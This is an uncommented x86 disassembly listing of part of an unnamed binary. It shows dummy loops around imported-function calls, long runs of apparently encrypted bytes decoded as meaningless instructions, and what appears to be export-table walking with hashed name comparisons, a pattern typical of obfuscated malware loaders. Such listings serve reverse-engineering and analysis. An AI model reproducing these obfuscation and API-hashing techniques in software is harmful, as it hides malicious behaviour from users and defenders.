  410256:	and    DWORD PTR ds:0x433757,0x0
  410260:	mov    ecx,DWORD PTR ds:0x433757
  410266:	inc    ecx
  410267:	mov    DWORD PTR ds:0x433757,ecx
  41026d:	cmp    DWORD PTR ds:0x433757,0xf
  410274:	jne    0x410288
  41027a:	push   DWORD PTR [ebp-0x10]
  41027d:	push   0x178b
  410282:	call   DWORD PTR ds:0x4121c0
  410288:	cmp    DWORD PTR ds:0x433757,0xe
  41028f:	jne    0x4102a4
  410295:	xor    ecx,ecx
  410297:	xor    ecx,DWORD PTR ds:0x433757
  41029d:	inc    ecx
  41029e:	mov    DWORD PTR ds:0x433757,ecx
  4102a4:	cmp    DWORD PTR ds:0x433757,0x1b
  4102ab:	jb     0x410260
  4102b1:	inc    ecx
  4102b2:	mov    DWORD PTR [ebp-0x28],esi
  4102b5:	not    ecx
  4102b7:	mov    DWORD PTR [ebp-0x2c],esi
  4102ba:	and    DWORD PTR ds:0x433723,0x0
  4102c4:	xor    ecx,ecx
  4102c6:	xor    ecx,DWORD PTR ds:0x433723
  4102cc:	inc    ecx
  4102cd:	mov    DWORD PTR ds:0x433723,ecx
  4102d3:	cmp    DWORD PTR ds:0x433723,0x22
  4102da:	jne    0x4102e9
  4102e0:	push   DWORD PTR [ebp-0x1c]
  4102e3:	call   DWORD PTR ds:0x412284
  4102e9:	cmp    DWORD PTR ds:0x433723,0x17
  4102f0:	jb     0x4102c4
  4102f6:	add    ecx,DWORD PTR ds:0x4336eb
  4102fc:	mov    DWORD PTR [ebp-0x14],esi
  4102ff:	mov    DWORD PTR [ebp-0x8],esi
  410302:	sub    DWORD PTR ds:0x43372b,0x6d7d
  41030c:	mov    ecx,DWORD PTR [ebp-0x18]
  41030f:	xor    DWORD PTR ds:0x4336e3,0x433647
  410319:	xor    ecx,eax
  41031b:	and    DWORD PTR ds:0x433733,0x0
  410325:	mov    eax,ds:0x433733
  41032a:	inc    eax
  41032b:	mov    ds:0x433733,eax
  410330:	cmp    DWORD PTR ds:0x433733,0xd
  410337:	jne    0x410348
  41033d:	push   0x8573
  410342:	call   DWORD PTR ds:0x4120dc
  410348:	cmp    DWORD PTR ds:0x433733,0xc
  41034f:	jne    0x410360
  410355:	mov    eax,ds:0x433733
  41035a:	inc    eax
  41035b:	mov    ds:0x433733,eax
  410360:	cmp    DWORD PTR ds:0x433733,0x18
  410367:	jb     0x410325
  41036d:	xor    eax,0x75f4
  410372:	xor    edi,edi
  410374:	mov    eax,ds:0x4336e3
  410379:	sbb    eax,DWORD PTR ds:0x433763
  41037f:	mov    ds:0x4336e3,eax
  410384:	add    ecx,ebx
  410386:	movzx  eax,BYTE PTR ds:0x4336ab
  41038d:	mov    DWORD PTR [ebp-0x20],ecx
  410390:	mov    eax,DWORD PTR [ebp-0x20]
  410393:	mov    DWORD PTR ds:0x433667,0x63b9
  41039d:	je     0x410967
  4103a3:	and    DWORD PTR ds:0x433647,0x0
  4103ad:	jmp    0x4103c0
  4103b2:	xor    eax,eax
  4103b4:	xor    eax,DWORD PTR ds:0x433647
  4103ba:	inc    eax
  4103bb:	mov    ds:0x433647,eax
  4103c0:	cmp    DWORD PTR ds:0x433647,0x14
  4103c7:	jae    0x410465
  4103cd:	cmp    DWORD PTR ds:0x433647,0xd
  4103d4:	jne    0x4103e6
  4103da:	push   DWORD PTR [ebp-0x20]
  4103dd:	push   DWORD PTR [ebp-0x18]
  4103e0:	call   DWORD PTR ds:0x412288
  4103e6:	cmp    DWORD PTR ds:0x433647,0xc
  4103ed:	jne    0x4103fe
  4103f3:	mov    eax,ds:0x433647
  4103f8:	inc    eax
  4103f9:	mov    ds:0x433647,eax
  4103fe:	jmp    0x4103b2
  410403:	mov    DWORD PTR ds:0x433757,0x1e
  41040d:	cmp    DWORD PTR ds:0x433757,0x0
  410414:	je     0x410465
  41041a:	cmp    DWORD PTR ds:0x433757,0x4
  410421:	jne    0x41043a
  410427:	push   DWORD PTR [ebp-0xc]
  41042a:	push   0x433974
  41042f:	push   0x43365f
  410434:	call   DWORD PTR ds:0x4121c4
  41043a:	cmp    DWORD PTR ds:0x433757,0x5
  410441:	jne    0x410452
  410447:	mov    eax,ds:0x433757
  41044c:	dec    eax
  41044d:	mov    ds:0x433757,eax
  410452:	xor    eax,eax
  410454:	add    eax,DWORD PTR ds:0x433757
  41045a:	dec    eax
  41045b:	mov    ds:0x433757,eax
  410460:	jmp    0x41040d
  410465:	mov    eax,DWORD PTR [ebp-0x4]
  410468:	xor    eax,0x7510853
  41046d:	sub    DWORD PTR ds:0x433757,0xdb8
  410477:	add    eax,ebx
  410479:	mov    DWORD PTR ds:0x4336a7,0x3f77
  410483:	cmp    edi,eax
  410485:	jne    0x4107cf
  41048b:	sub    DWORD PTR ds:0x43369b,0x29bd
  410495:	push   DWORD PTR [ebp+0x8]
  410498:	call   0x40f639
  41049d:	inc    ecx
  41049e:	mov    DWORD PTR [ebp-0x20],eax
  4104a1:	adc    DWORD PTR ds:0x4336e3,0xc37
  4104ab:	jmp    0x4105e6
  4104b0:	sbb    eax,0xb1fd9f18
  4104b5:	jge    0x410514
  4104b7:	fsub   DWORD PTR [edx+0xa]
  4104ba:	adc    ecx,ebx
  4104bc:	mov    ebp,0x99b6a4f6
  4104c1:	mov    esi,0x7f127c7c
  4104c6:	jl     0x410544
  4104c8:	jl     0x41048f
  4104ca:	pmaddwd mm6,mm4
  4104cd:	xchg   esi,eax
  4104ce:	cmp    BYTE PTR [ecx-0x71bbb50e],bh
  4104d4:	and    eax,0xb7a75618
  4104d9:	dec    ebx
  4104da:	add    ch,ah
  4104dc:	fstp   TBYTE PTR [ebx-0x2e]
  4104df:	mov    edx,0x8e03ac4b
  4104e4:	mov    ds:0x8c7fea90,al
  4104e9:	cmc    
  4104ea:	aas    
  4104eb:	jle    0x4104d3
  4104ed:	(bad)  
  4104ef:	add    eax,0x683de247
  4104f4:	push   cs
  4104f5:	jmp    0x41056d
  4104f7:	std    
  4104f8:	pop    edi
  4104f9:	jle    0x41053e
  4104fb:	xor    al,0x0
  4104fd:	push   esp
  4104fe:	sub    cl,BYTE PTR [esi]
  410500:	push   esi
  410501:	jb     0x410502
  410503:	jae    0x4104bb
  410505:	adc    DWORD PTR [ecx],edi
  410507:	shl    DWORD PTR [edx],cl
  410509:	iret   
  41050a:	cdq    
  41050b:	sbb    DWORD PTR [edx+0x5ac5c914],eax
  410511:	mov    ds:0xc13c44a3,eax
  410516:	mov    dl,0x6b
  410518:	and    al,0x7d
  41051a:	daa    
  41051b:	dec    ebx
  41051c:	in     al,dx
  41051d:	in     eax,dx
  41051e:	cwde   
  41051f:	lea    esi,ds:0xd4bef75f
  410525:	outs   dx,DWORD PTR ds:[esi]
  410526:	out    0x16,eax
  410528:	mov    ch,0x52
  41052a:	and    cl,BYTE PTR [eax-0x35]
  41052d:	repz test DWORD PTR [ecx],0x976cca5b
  410534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410535:	mov    eax,ds:0x153b17a7
  41053a:	call   0xf4ce:0xc9a9a2d6
  410541:	sbb    al,0xfc
  410543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410544:	int    0x86
  410546:	pop    ebp
  410547:	enter  0x9a11,0xb3
  41054b:	iret   
  41054c:	xchg   edx,eax
  41054d:	mov    WORD PTR [ecx+0x6f0fa54a],fs
  410553:	xor    eax,0x81699d50
  410558:	ins    DWORD PTR es:[edi],dx
  410559:	or     eax,0x784b406d
  41055e:	mov    edi,0x961f1a96
  410563:	adc    esi,edx
  410565:	mov    eax,ds:0x90a689aa
  41056a:	pop    es
  41056b:	dec    ebx
  41056c:	push   es
  41056d:	pop    ebx
  41056e:	jbe    0x4105b5
  410570:	stc    
  410571:	jb     0x410553
  410573:	adc    eax,0xfa4c1e6a
  410578:	pop    ds
  410579:	pop    eax
  41057a:	jp     0x4105e6
  41057c:	xchg   edi,eax
  41057d:	push   ss
  41057e:	and    ah,ch
  410580:	mov    bl,0xa9
  410582:	or     ebx,eax
  410584:	in     eax,dx
  410585:	les    ebp,FWORD PTR [esp+ecx*1]
  410588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410589:	pop    ebx
  41058a:	comiss xmm1,xmm2
  41058d:	jns    0x41055d
  41058f:	mov    dl,0xb9
  410591:	pop    edi
  410592:	arpl   WORD PTR [edx-0x2e818968],si
  410598:	(bad)  
  410599:	mov    dl,0x7f
  41059b:	test   DWORD PTR [esi],ecx
  41059d:	add    al,0xdf
  41059f:	arpl   WORD PTR [ecx-0x6d],si
  4105a2:	inc    edx
  4105a3:	cli    
  4105a4:	jg     0x410601
  4105a6:	inc    ebx
  4105a7:	cs icebp 
  4105a9:	sub    dh,BYTE PTR [ebx]
  4105ab:	es xor eax,0x4bb11188
  4105b1:	shr    DWORD PTR [edi+0x17],1
  4105b4:	mov    ebx,0xf49da66b
  4105b9:	jge    0x410575
  4105bb:	push   esi
  4105bc:	inc    eax
  4105bd:	push   0xa82a16f5
  4105c2:	cmp    al,0x1
  4105c4:	stos   DWORD PTR es:[edi],eax
  4105c5:	and    esi,ebp
  4105c7:	inc    ebp
  4105c8:	cmp    al,0x83
  4105ca:	inc    esp
  4105cb:	xchg   DWORD PTR [ebx-0x6f],ebx
  4105ce:	and    ch,dh
  4105d0:	jae    0x41056a
  4105d2:	(bad)  
  4105d3:	iret   
  4105d4:	(bad)  
  4105d5:	pop    edi
  4105d6:	or     DWORD PTR [ebx+0xc],eax
  4105d9:	ret    
  4105da:	or     eax,0x5dc1f8f8
  4105df:	out    0x68,al
  4105e1:	adc    DWORD PTR [esi-0x5d],edi
  4105e4:	ret    0x8b00
  4105e7:	inc    ebp
  4105e8:	cld    
  4105e9:	sbb    DWORD PTR ds:0x4336d7,0x55ce
  4105f3:	mov    ecx,DWORD PTR [ebp-0x20]
  4105f6:	adc    DWORD PTR ds:0x43364f,ebx
  4105fc:	mov    esi,0x7510853
  410601:	xor    eax,esi
  410603:	dec    DWORD PTR ds:0x43372f
  410609:	add    eax,ebx
  41060b:	cmp    ecx,eax
  41060d:	je     0x41094b
  410613:	add    DWORD PTR ds:0x43372f,0x3520
  41061d:	push   DWORD PTR [ebp-0x20]
  410620:	push   DWORD PTR [ebp+0x8]
  410623:	call   0x405227
  410628:	mov    DWORD PTR [ebp-0x14],eax
  41062b:	adc    eax,ecx
  41062d:	mov    eax,DWORD PTR [ebp-0x4]
  410630:	and    DWORD PTR ds:0x4336df,edi
  410636:	jmp    0x410771
  41063b:	pop    ss
  41063c:	imul   ecx,DWORD PTR ds:0x7d706d64,0xb02edf69
  410646:	loope  0x4105d7
  410648:	repz popf 
  41064a:	xor    DWORD PTR [edi+0x127c7cb9],edi
  410650:	jg     0x4106ce
  410652:	jl     0x410658
  410654:	inc    esp
  410655:	loope  0x4106c6
  410657:	push   0x47248aee
  41065c:	repnz inc esp
  41065e:	loope  0x4105f5
  410660:	add    al,0x6b
  410662:	rcr    cl,0x3
  410665:	inc    ebp
  410666:	sbb    al,0x88
  410668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410669:	dec    ecx
  41066a:	adc    dl,BYTE PTR [ebp-0x26a61f3e]
  410670:	cmp    eax,edi
  410672:	out    0x94,eax
  410674:	inc    ebp
  410675:	(bad)  
  410676:	shl    BYTE PTR [edx-0x76],cl
  410679:	xor    al,0x2b
  41067b:	dec    ecx
  41067c:	outs   dx,BYTE PTR ds:[esi]
  41067d:	xor    al,0xd9
  41067f:	jbe    0x410678
  410681:	dec    esp
  410682:	int3   
  410683:	mul    BYTE PTR [eax+0x84cdcd2]
  410689:	(bad)  
  41068a:	ja     0x410617
  41068c:	mov    cl,0x93
  41068e:	sub    BYTE PTR [ecx+ecx*4-0x16a3fbdb],ch
  410695:	inc    esp
  410696:	ins    BYTE PTR es:[edi],dx
  410697:	frstor [eax+ebp*4]
  41069a:	arpl   bp,dx
  41069c:	xor    DWORD PTR [ebp-0x57],esi
  41069f:	mov    cl,0x84
  4106a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106a2:	mov    cl,0x4e
  4106a4:	mov    ebp,0x6ba86faa
  4106a9:	in     eax,0x7b
  4106ab:	cld    
  4106ac:	cmp    DWORD PTR [edx],ebp
  4106ae:	enter  0xfe26,0x65
  4106b2:	push   ss
  4106b3:	dec    ecx
  4106b4:	out    0x59,al
  4106b6:	add    al,0x4c
  4106b8:	cs cmp edx,ebp
  4106bb:	mov    al,BYTE PTR [edi]
  4106bd:	inc    edi
  4106be:	push   ds
  4106bf:	sbb    dl,BYTE PTR es:[esi]
  4106c2:	clc    
  4106c3:	mov    ah,0x45
  4106c5:	bound  ecx,QWORD PTR [ebx-0x753e97ea]
  4106cb:	outs   dx,BYTE PTR ds:[esi]
  4106cc:	sub    DWORD PTR [edi-0x1ebc7baf],ebx
  4106d2:	adc    BYTE PTR [edi+0x4d6773a],ah
  4106d8:	or     bl,dl
  4106da:	dec    ecx
  4106db:	inc    ecx
  4106dc:	jecxz  0x410669
  4106de:	push   edx
  4106df:	mov    eax,0x52ccf4b9
  4106e4:	mov    BYTE PTR [edx-0x23],dh
  4106e7:	(bad)  
  4106e8:	lods   eax,DWORD PTR ds:[esi]
  4106e9:	test   al,0xbc
  4106eb:	test   ebp,edx
  4106ed:	sar    DWORD PTR [ecx+0xa],0xf6
  4106f1:	mov    ebp,ebx
  4106f3:	mov    esi,0xabf9198c
  4106f8:	add    eax,0x61560621
  4106fd:	sbb    BYTE PTR [edx],dh
  4106ff:	sbb    al,BYTE PTR [edx]
  410701:	dec    ebp
  410702:	mov    al,0x80
  410704:	shr    BYTE PTR ds:0x929e,cl
  410709:	mov    cl,0x2a
  41070b:	jl     0x410728
  41070d:	dec    esi
  41070e:	inc    eax
  41070f:	cli    
  410710:	inc    esi
  410711:	xchg   esp,eax
  410712:	ds or  al,bh
  410715:	pusha  
  410716:	xchg   ebx,eax
  410717:	loope  0x410749
  410719:	adc    al,0x1
  41071b:	jmp    0x2dab:0xef46f3c1
  410722:	loop   0x410707
  410724:	xchg   DWORD PTR [esi],esp
  410726:	push   edx
  410727:	test   BYTE PTR ss:[eax-0x4f8efe4e],al
  41072e:	stos   DWORD PTR es:[edi],eax
  41072f:	fs test al,0x6f
  410732:	sub    edx,esp
  410734:	lea    edi,[edi+0x59]
  410737:	lock sub BYTE PTR ds:0x5deadb1d,dl
  41073e:	fsubrp st(7),st
  410740:	ret    0x448b
  410743:	sar    BYTE PTR [edi-0x6a5de547],cl
  410749:	ret    0x80cf
  41074c:	add    bl,bl
  41074e:	loopne 0x41078d
  410750:	ins    BYTE PTR es:[edi],dx
  410751:	push   es
  410752:	mov    al,ds:0x23c2f32f
  410757:	cld    
  410758:	je     0x410703
  41075a:	arpl   WORD PTR fs:[ebx+0x6e34c6ab],bp
  410761:	loop   0x410706
  410763:	(bad)  
  410764:	adc    al,BYTE PTR [ecx]
  410766:	call   0xa89b:0xe4f9c435
  41076d:	cs loop 0x4107d2
  410770:	pop    es
  410771:	mov    ecx,DWORD PTR [ebp-0x14]
  410774:	add    DWORD PTR ds:0x433667,0x3989
  41077e:	xor    eax,esi
  410780:	sbb    DWORD PTR ds:0x433663,0x43364f
  41078a:	add    eax,ebx
  41078c:	cmp    ecx,eax
  41078e:	je     0x41094b
  410794:	mov    eax,DWORD PTR [ebp-0x14]
  410797:	xor    DWORD PTR ds:0x4336a3,edi
  41079d:	mov    eax,DWORD PTR [eax+0x18]
  4107a0:	sub    ecx,DWORD PTR ds:0x433763
  4107a6:	mov    DWORD PTR [ebp-0x20],eax
  4107a9:	mov    eax,DWORD PTR [ebp-0x14]
  4107ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4107af:	add    ecx,DWORD PTR [eax+0x20]
  4107b2:	mov    DWORD PTR [ebp-0x28],ecx
  4107b5:	mov    eax,DWORD PTR [ebp-0x14]
  4107b8:	mov    ecx,DWORD PTR [ebp+0x8]
  4107bb:	add    ecx,DWORD PTR [eax+0x24]
  4107be:	mov    DWORD PTR [ebp-0x2c],ecx
  4107c1:	mov    eax,DWORD PTR [ebp-0x14]
  4107c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4107c7:	add    ecx,DWORD PTR [eax+0x1c]
  4107ca:	xor    esi,esi
  4107cc:	mov    DWORD PTR [ebp-0x14],ecx
  4107cf:	mov    eax,DWORD PTR [ebp-0x28]
  4107d2:	jmp    0x41090d
  4107d7:	push   ebp
  4107d8:	xchg   esi,eax
  4107d9:	ins    BYTE PTR es:[edi],dx
  4107da:	stos   DWORD PTR es:[edi],eax
  4107db:	jae    0x41085a
  4107dd:	push   ebp
  4107de:	jbe    0x4107cf
  4107e0:	mov    ds:0xbc70ac5a,eax
  4107e5:	stos   BYTE PTR es:[edi],al
  4107e6:	rcr    DWORD PTR [ebp-0x48],1
  4107e9:	jl     0x410867
  4107eb:	adc    bh,BYTE PTR [edi+0x7c]
  4107ee:	jl     0x41085d
  4107f0:	shr    eax,0x9e
  4107f3:	mov    ds:0x8be07b40,eax
  4107f8:	iret   
  4107f9:	adc    dl,BYTE PTR [esi]
  4107fb:	fmul   st,st(2)
  4107fd:	loopne 0x410851
  4107ff:	jns    0x41078a
  410801:	mov    ecx,0xdba18547
  410806:	push   ebx
  410807:	sahf   
  410808:	lahf   
  410809:	push   ebx
  41080a:	sbb    ah,ch
  41080c:	les    esi,FWORD PTR ds:0xd7dc560
  410812:	dec    ebp
  410813:	push   edx
  410814:	fwait
  410815:	cmp    eax,0xae12294f
  41081a:	push   cs
  41081b:	popa   
  41081c:	enter  0x861f,0x94
  410820:	adc    eax,0x7db54c73
  410825:	out    0xaf,eax
  410827:	test   DWORD PTR [eax],eax
  410829:	mov    ecx,0x372052fd
  41082e:	mov    BYTE PTR [eax],ah
  410830:	inc    edi
  410831:	sub    eax,0xe5f9a4f4
  410836:	add    BYTE PTR [edi-0x18c820a0],0x1b
  41083d:	ret    
  41083e:	imul   DWORD PTR [edi]
  410840:	inc    ecx
  410841:	mov    ebx,DWORD PTR [ebx+esi*4]
  410844:	sahf   
  410845:	jb     0x410885
  410847:	popa   
  410848:	sbb    esp,DWORD PTR [esi+ecx*1+0x6a]
  41084c:	mov    edx,DWORD PTR [esi]
  41084e:	test   bh,al
  410850:	sub    eax,0x66ffaa02
  410855:	lock xor BYTE PTR [ecx-0x18a5989c],dh
  41085c:	and    edx,DWORD PTR [ecx-0x20d1a028]
  410862:	mov    edx,0x2c97a54c
  410867:	out    dx,al
  410868:	outs   dx,DWORD PTR ds:[esi]
  410869:	in     al,0xb7
  41086b:	(bad)  
  41086d:	pusha  
  41086e:	sar    esp,0xf0
  410871:	push   0xffffff8e
  410873:	dec    eax
  410874:	jo     0x4108c3
  410876:	xor    al,0x77
  410878:	fldenv [esi+0x55]
  41087b:	jno    0x4108c6
  41087d:	or     ah,BYTE PTR ds:0x16f5c37e
  410883:	mov    eax,ds:0x8ea0a4ec
  410888:	test   DWORD PTR [ebx+0x2e],esp
  41088b:	sbb    DWORD PTR [eax+edi*2-0x48],edi
  41088f:	sub    ch,ah
  410891:	mov    ds:0x5f1215aa,eax
  410896:	jne    0x41088f
  410898:	mov    edi,0x2f89fc
  41089d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41089e:	push   edx
  41089f:	jbe    0x4108af
  4108a1:	shr    DWORD PTR [ecx],cl
  4108a3:	pop    edx
  4108a4:	mov    al,0xf3
  4108a6:	mov    BYTE PTR fs:[ecx+0x36638487],bh
  4108ad:	mov    eax,0xaff21b0e
  4108b2:	mov    edi,0xa3f45908
  4108b7:	inc    esi
  4108b8:	and    DWORD PTR [edx],0x48
  4108bb:	lds    eax,FWORD PTR [ecx+eax*8-0x222b50a6]
  4108c2:	and    edi,DWORD PTR [edx-0x27]
  4108c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108c6:	scas   al,BYTE PTR es:[edi]
  4108c7:	push   edx
  4108c8:	out    0x6e,eax
  4108ca:	pop    es
  4108cb:	in     eax,dx
  4108cc:	and    bh,ch
  4108ce:	mov    BYTE PTR [edx],0xb2
  4108d1:	sar    DWORD PTR [edx-0x8d3d9db],0xf8
  4108d8:	xor    DWORD PTR [esi],edi
  4108da:	jbe    0x410878
  4108dc:	adc    al,0x90
  4108de:	xor    esp,DWORD PTR [ebp-0x10]
  4108e1:	cwde   
  4108e2:	lds    ebp,FWORD PTR [edx]
  4108e4:	inc    esp
  4108e5:	inc    ebp
  4108e6:	jl     0x410889
  4108e8:	dec    eax
  4108e9:	loope  0x4108a9
  4108eb:	icebp  
  4108ec:	adc    al,0x4f
  4108ee:	inc    ebp
  4108ef:	stos   BYTE PTR es:[edi],al
  4108f0:	(bad)  
  4108f1:	fsubr  QWORD PTR [ebx-0x6ec7f8e9]
  4108f7:	(bad)  
  4108f8:	shl    al,0x5a
  4108fb:	bound  eax,QWORD PTR [edi]
  4108fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108fe:	and    ebx,esi
  410900:	call   0x4370ae7a
  410905:	lea    edx,[eax+ebx*2+0x1]
  410909:	daa    
  41090a:	call   0x308:0x4d8b508d
  410911:	or     al,0xb8
  410913:	lea    eax,[ebp-0x8]
  410916:	mov    DWORD PTR [ebp-0x30],ecx
  410919:	push   eax
  41091a:	push   DWORD PTR [ebp-0x30]
  41091d:	push   DWORD PTR [ebp+0xc]
  410920:	call   0x4040e1
  410925:	mov    eax,DWORD PTR [ebp-0x4]
  410928:	mov    ecx,DWORD PTR [ebp-0x8]
  41092b:	xor    eax,0x7510853
  410930:	add    eax,ebx
  410932:	cmp    ecx,eax
  410934:	jne    0x410957
  41093a:	mov    eax,DWORD PTR [ebp-0x20]
  41093d:	inc    edi
  41093e:	cmp    edi,eax
  410940:	jb     0x4103a3
  410946:	jmp    0x410967
  41094b:	mov    eax,DWORD PTR [ebp-0x4]
  41094e:	xor    eax,esi
  410950:	add    eax,ebx
  410952:	jmp    0x41148d
  410957:	mov    eax,DWORD PTR [ebp-0x2c]
  41095a:	movzx  eax,WORD PTR [eax+edi*2]
  41095e:	mov    ecx,DWORD PTR [ebp-0x14]
  410961:	mov    eax,DWORD PTR [ecx+eax*4]
  410964:	mov    DWORD PTR [ebp+0xc],eax
  410967:	mov    eax,DWORD PTR [ebp-0x4]
  41096a:	mov    ecx,DWORD PTR [ebp-0x8]
  41096d:	xor    eax,0x7510853
  410972:	add    eax,ebx
  410974:	cmp    ecx,eax
  410976:	jne    0x410989
  41097c:	mov    eax,DWORD PTR [ebp-0x4]
  41097f:	xor    eax,0x7510853
  410984:	jmp    0x410950
  410989:	mov    eax,DWORD PTR [ebp+0xc]
  41098c:	jmp    0x410ac7
  410991:	inc    ebx
  410992:	fs dec edi
  410994:	fwait
  410995:	imul   esi,DWORD PTR [ebx-0x6cde9b8d],0x78
  41099c:	or     BYTE PTR [edx-0x2d],ah
  41099f:	ja     0x41094c
  4109a1:	jae    0x41095e
  4109a3:	jl     0x410a21
  4109a5:	adc    bh,BYTE PTR [edi+0x7c]
  4109a8:	jl     0x410987
  4109aa:	hlt    
  4109ab:	adc    al,0x82
  4109ad:	js     0x410a11
  4109af:	je     0x4109b6
  4109b1:	fadd   st(2),st
  4109b3:	ins    DWORD PTR es:[edi],dx
  4109b4:	rol    DWORD PTR [edx-0x8],cl
  4109b7:	outs   dx,DWORD PTR ds:[esi]
  4109b8:	not    bl
  4109ba:	pop    es
  4109bb:	(bad)  
  4109bc:	lods   al,BYTE PTR ds:[esi]
  4109bd:	mov    edi,0xa60ca8c8
  4109c2:	cmp    esi,DWORD PTR [ecx+0x63c85d26]
  4109c8:	retf   
  4109c9:	adc    BYTE PTR [esi],cl
  4109cb:	leave  
  4109cc:	or     ch,BYTE PTR [ecx]
  4109ce:	add    al,0xf
  4109d0:	fsubr  DWORD PTR [esi+0x64]
  4109d3:	fs inc ecx
  4109d5:	mov    ebp,0xe26eef81
  4109da:	outs   dx,BYTE PTR ds:[esi]
  4109db:	push   edi
  4109dc:	data16 mov ax,ds:0x667eafff
  4109e3:	call   0x3322:0xd25de7e8
  4109ea:	inc    ebp
  4109eb:	push   edx
  4109ec:	adc    ebp,DWORD PTR [edi-0x55417b60]
  4109f2:	sbb    BYTE PTR [ecx+0x53877d12],0x7
  4109f9:	cmp    ch,bh
  4109fb:	xor    al,0x8f
  4109fd:	mov    ebx,0xc4f5e17b
  410a02:	not    bl
  410a04:	and    esi,ebx
  410a06:	pop    es
  410a07:	xor    BYTE PTR [eax+0x56],cl
  410a0a:	mov    ds:0xc809dd93,al
  410a0f:	and    eax,ecx
  410a11:	lds    ecx,FWORD PTR [eax-0x782fe259]
  410a17:	mov    edx,0x61144ea0
  410a1c:	aad    0xc7
  410a1e:	cwde   
  410a1f:	add    DWORD PTR [edx-0x14],esi
  410a22:	ds pop es
  410a24:	jbe    0x410a4b
  410a26:	mov    ebx,0xe95810c2
  410a2b:	sti    
  410a2c:	mov    ah,0x60
  410a2e:	push   ecx
  410a2f:	jmp    0x4109b4
  410a31:	jns    0x4109cd
  410a33:	ret    
  410a34:	xlat   BYTE PTR ds:[bx]
  410a36:	nop
  410a37:	sbb    BYTE PTR [ebx-0x1b],dh
  410a3a:	sbb    al,0xd2
  410a3c:	xchg   ebx,eax
  410a3d:	fwait
  410a3e:	pop    ecx
  410a3f:	adc    DWORD PTR [ebx-0x9ae6ae4],edx
  410a45:	xchg   esi,eax
  410a46:	and    ebx,ebx
  410a48:	ds mov esi,0xb17fd530
  410a4e:	cs mov ch,0x74
  410a51:	jns    0x410aa3
  410a53:	xor    al,0x50
  410a55:	inc    ecx
  410a56:	mov    cl,0x66
  410a58:	call   0x7e8c:0x9324fda4
  410a5f:	jae    0x410a46
  410a61:	and    ebp,DWORD PTR [eax+0x72]
  410a64:	sbb    al,0xbf
  410a66:	dec    eax
  410a67:	pop    esp
  410a68:	mov    ah,0xd0
  410a6a:	and    al,0xa4
  410a6c:	mov    ah,0x4a
  410a6e:	dec    esp
  410a6f:	test   eax,0xf622acf0
  410a74:	inc    ecx
  410a75:	retf   0x6e92
  410a78:	sub    eax,0x21728b4e
  410a7d:	fbstp  TBYTE PTR [edi+eax*2]
  410a80:	push   cs
  410a81:	icebp  
  410a82:	retf   0x7e
  410a85:	sub    eax,0x8a60a397
  410a8a:	mov    ss,ecx
  410a8c:	sub    DWORD PTR [edi],0x840d8878
  410a92:	sbb    eax,0xeae9a37
  410a97:	dec    esp
  410a98:	mov    ch,cl
  410a9a:	es (bad) 
  410a9c:	jmp    0xc7a0810e
  410aa1:	xchg   ecx,eax
  410aa2:	or     ch,al
  410aa4:	lods   eax,DWORD PTR ds:[esi]
  410aa5:	add    DWORD PTR [ebp+0x5cc06659],edx
  410aab:	(bad)  
  410aac:	aas    
  410aad:	stos   BYTE PTR es:[edi],al
  410aae:	stos   DWORD PTR es:[edi],eax
  410aaf:	mov    DWORD PTR [edi+0x3fca324a],eax
  410ab5:	rcr    DWORD PTR [ebp-0x5b109ec9],cl
  410abb:	jmp    0x56bcd08d
  410ac0:	mov    WORD PTR [edx-0x54],fs
  410ac3:	out    dx,eax
  410ac4:	or     ebp,DWORD PTR [esi+0x8450385]
  410aca:	mov    DWORD PTR [ebp-0x10],eax
  410acd:	mov    eax,DWORD PTR [ebp-0x1c]
  410ad0:	test   eax,eax
  410ad2:	je     0x41108e
  410ad8:	mov    DWORD PTR [ebp-0x24],esi
  410adb:	push   0xb
  410add:	pop    ecx
  410ade:	push   0x5
  410ae0:	jmp    0x410c1b
  410ae5:	jbe    0x410ad6
  410ae7:	inc    edi
  410ae8:	xchg   DWORD PTR [ecx-0x49],eax
  410aeb:	jbe    0x410ad6
  410aed:	and    al,0x2e
  410aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410af0:	fcomp  QWORD PTR [ebp+0x6e]
  410af3:	xchg   esi,eax
  410af4:	ficom  WORD PTR [ecx]
  410af6:	inc    ebp
  410af7:	jl     0x410b75
  410af9:	adc    bh,BYTE PTR [edi+0x7c]
  410afc:	jl     0x410b75
  410afe:	push   0xf91701a6
  410b03:	sbb    ebp,DWORD PTR [ebp-0x288d4ed6]
  410b09:	aam    0x5
  410b0b:	push   0x30
  410b0d:	sbb    bl,BYTE PTR ds:0x42754cc3
  410b13:	and    ebp,DWORD PTR [esi-0x3]
  410b16:	mov    cl,0x24
  410b18:	mov    es,WORD PTR [ecx+0x35e396ea]
  410b1e:	das    
  410b1f:	pop    ebx
  410b20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b21:	aaa    
  410b22:	xchg   edx,eax
  410b23:	jge    0x410adf
  410b25:	fwait
  410b26:	ins    BYTE PTR es:[edi],dx
  410b27:	dec    esp
  410b28:	loop   0x410ac8
  410b2a:	in     eax,dx
  410b2b:	cdq    
  410b2c:	push   edi
  410b2d:	in     al,0x1b
  410b2f:	dec    ebp
  410b30:	pop    ss
  410b31:	push   esi
  410b32:	cmc    
  410b33:	mov    dl,0xc4
  410b35:	dec    esp
  410b36:	pop    ds
  410b37:	nop
  410b38:	xchg   ebp,eax
  410b39:	stos   DWORD PTR es:[edi],eax
  410b3a:	mov    ch,0xa0
  410b3c:	pop    esi
  410b3d:	pusha  
  410b3e:	into   
  410b3f:	inc    edi
  410b40:	push   es
  410b41:	xchg   esi,eax
  410b42:	into   
  410b43:	lea    ebx,[ebp-0x576b90a2]
  410b49:	and    ebx,edx
  410b4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b4c:	jnp    0x410b46
  410b4e:	mov    ch,0xf0
  410b50:	push   ecx
  410b51:	pop    es
  410b52:	cwde   
  410b53:	push   ecx
  410b54:	mov    bh,al
  410b56:	cmc    
